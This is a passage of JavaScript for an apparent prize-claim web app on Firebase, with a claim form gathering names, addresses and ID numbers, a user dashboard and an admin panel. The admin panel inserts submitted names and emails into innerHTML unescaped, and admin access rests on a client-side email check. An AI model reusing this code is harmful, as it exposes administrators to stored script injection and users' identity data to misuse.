  const form=$('prize-form');if(!form)return;

  txt('pf-title',t('pf_title'));txt('pf-sub',t('pf_sub'));
  txt('pf-name-lbl',t('pf_name'));txt('pf-address-lbl',t('pf_address'));
  txt('pf-id-lbl',t('pf_id'));txt('pf-social-lbl',t('pf_social'));
  txt('pf-submit-btn',t('pf_submit'));txt('pf-login-note',t('pf_login'));
  txt('ps-title',t('ps_title'));txt('ps-code-label',t('ps_code_label'));
  txt('ps-shot',t('ps_shot'));txt('ps-note',t('ps_note'));txt('ps-dash-btn',t('ps_dash'));
  ph('prize-name',t('pf_name_ph'));ph('prize-address',t('pf_address_ph'));
  ph('prize-id',t('pf_id_ph'));ph('prize-social',t('pf_social_ph'));

  form.addEventListener('submit',async e=>{
    e.preventDefault();
    const user=auth.currentUser;
    if(!user){
      toast('Please sign in to claim your prize.','error');
      setTimeout(()=>{location.href='login.html';},1500);
      return;
    }
    const fullName=$('prize-name').value.trim();
    const address=$('prize-address').value.trim();
    const idNumber=$('prize-id').value.trim();
    const social=$('prize-social').value.trim();
    if(!fullName||!address||!idNumber){toast('Please fill all required fields.','error');return;}

    const orderCode=genCode();
    const btn=form.querySelector('button[type=submit]');
    btn.disabled=true;btn.textContent=t('pf_submitting');
    try{
      await addDoc(collection(db,'prizeClaims'),{
        uid:user.uid,email:user.email,fullName,address,idNumber,social,
        orderCode,status:'pending',submittedAt:serverTimestamp()
      });
      await setDoc(doc(db,'users',user.uid),{orderCode,prizeStatus:'pending'},{merge:true});
      $('prize-form-wrap').style.display='none';
      txt('prize-order-code',orderCode);
      const s=$('prize-success');
      if(s){s.style.display='block';s.scrollIntoView({behavior:'smooth'});}
    }catch(err){
      console.error(err);
      toast('Submission failed. Try again.','error');
      btn.disabled=false;btn.textContent=t('pf_submit');
    }
  });
}

// ═══════════════════════════════════════════════════════════════
//  DASHBOARD
// ═══════════════════════════════════════════════════════════════
export async function initDashboard(){
  onAuthStateChanged(auth,async user=>{
    if(!user){location.href='login.html';return;}
    let data={};
    try{const s=await getDoc(doc(db,'users',user.uid));if(s.exists())data=s.data();}catch(_){}
    txt('dash-name',data.name||user.email);txt('dash-email',data.email||user.email);
    txt('dash-phone',data.phone||'—');txt('dash-name-2',data.name||user.email);
    txt('dash-email-2',data.email||user.email);
    const ow=$('dash-order-wrap'),no=$('dash-no-order');
    if(data.orderCode){
      txt('dash-order-code',data.orderCode);
      txt('dash-order-status',data.prizeStatus||'pending');
      if(ow)ow.style.display='block';if(no)no.style.display='none';
    }else{
      if(ow)ow.style.display='none';if(no)no.style.display='block';
    }
  });
}

// ═══════════════════════════════════════════════════════════════
//  ADMIN — FIX: case-insensitive email, fallback query
// ═══════════════════════════════════════════════════════════════
export async function initAdmin(){
  onAuthStateChanged(auth,async user=>{
    // ✅ FIX: case-insensitive check
    if(!user||user.email.toLowerCase()!==ADMIN_EMAIL.toLowerCase()){
      location.href='login.html';return;
    }
    let snap;
    try{snap=await getDocs(query(collection(db,'prizeClaims'),orderBy('submittedAt','desc')));}
    catch(_){snap=await getDocs(collection(db,'prizeClaims'));}

    const tbody=$('claims-tbody');
    if(tbody){
      tbody.innerHTML='';
      snap.forEach(d=>{
        const c=d.data(),dt=c.submittedAt?.toDate().toLocaleDateString()||'—';
        const bc=c.status==='approved'?'badge-green':c.status==='rejected'?'badge-red':'badge-yellow';
        tbody.innerHTML+=`<tr>
          <td>${c.fullName||'—'}</td><td>${c.email||'—'}</td>
          <td><code style="font-size:.75rem">${c.orderCode||'—'}</code></td>
          <td>${dt}</td><td><span class="badge ${bc}">${c.status}</span></td>
          <td>
            <button class="btn btn-dark" style="padding:.3rem .7rem;font-size:.7rem" onclick="adminAction('${d.id}','approved')">✓ Approve</button>
            <button class="btn btn-red"  style="padding:.3rem .7rem;font-size:.7rem;margin-left:.25rem" onclick="adminAction('${d.id}','rejected')">✕ Reject</button>
          </td></tr>`;
      });
      if(snap.empty)tbody.innerHTML='<tr><td colspan="6" style="text-align:center;color:var(--gray-400);padding:2rem">No claims yet.</td></tr>';
    }
    txt('stat-claims',snap.size);

    let disc=20;
    try{const s=await getDoc(doc(db,'settings','global'));if(s.exists())disc=s.data().discountPct??20;}catch(_){}
    const di=$('admin-discount');if(di)di.value=disc;
    txt('stat-discount',disc+'%');

    $('save-discount')?.addEventListener('click',async()=>{
      const v=parseInt(di.value);
      if(isNaN(v)||v<1||v>80){toast('Enter 1–80','error');return;}
      await setDoc(doc(db,'settings','global'),{discountPct:v},{merge:true});
      txt('stat-discount',v+'%');toast('Discount → '+v+'%','success');
    });
  });
}

window.adminAction=async(id,status)=>{
  await updateDoc(doc(db,'prizeClaims',id),{status});
  toast('Updated: '+status,'success');
  setTimeout(()=>location.reload(),1000);
};
